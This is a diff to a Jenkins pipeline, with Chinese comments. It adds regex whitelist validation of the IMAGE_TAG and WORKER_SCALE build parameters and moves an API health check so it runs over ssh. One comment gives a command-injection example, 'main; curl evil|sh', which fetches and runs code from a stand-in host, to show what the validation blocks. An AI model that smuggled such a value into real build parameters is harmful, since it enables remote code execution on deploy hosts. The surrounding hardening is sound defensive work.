@@ -42,6 +42,24 @@ pipeline {
     }
 
     stages {
+        stage('参数校验') {
+            steps {
+                script {
+                    // IMAGE_TAG/WORKER_SCALE 是自由字符串参数，后续会插值进部署
+                    // 主机的远端 shell（发布 3/4）。先按白名单拒绝非法值，防止
+                    // 持有构建权限者借参数注入命令（如 "main; curl evil|sh"）。
+                    // IMAGE_TAG 只作 compose 的镜像 tag，合法字符集是
+                    // [A-Za-z0-9_][A-Za-z0-9._-]*，不含冒号/斜杠/空白/shell 元字符。
+                    if (!(params.IMAGE_TAG ==~ /[A-Za-z0-9_][A-Za-z0-9._-]*/)) {
+                        error "IMAGE_TAG 只允许字母/数字/点/下划线/连字符且不以符号开头：${params.IMAGE_TAG}"
+                    }
+                    if (!(params.WORKER_SCALE ==~ /[1-9][0-9]{0,2}/)) {
+                        error "WORKER_SCALE 必须为 1-999 的整数：${params.WORKER_SCALE}"
+                    }
+                }
+            }
+        }
+
         stage('Checkout') {
             steps {
                 checkout scm
@@ -196,7 +214,11 @@ pipeline {
         stage('冒烟验证') {
             when { expression { params.DEPLOY } }
             steps {
-                sh 'curl -fsS "http://$DEPLOY_HOST:${SERVER_PORT:-8000}/api/health"'
+                // API 直连口只绑部署主机 127.0.0.1（见 deploy/server/docker-compose.yml），
+                // 健康检查改在部署主机本机执行；web 端口仍从 Jenkins 主机探测。
+                sshagent(credentials: ['DEPLOY_SSH_KEY']) {
+                    sh 'ssh deploy@$DEPLOY_HOST "curl -fsS http://127.0.0.1:${SERVER_PORT:-8000}/api/health"'
+                }
                 sh 'curl -fsS "http://$DEPLOY_HOST:${WEB_PORT:-80}/"'
             }
         }
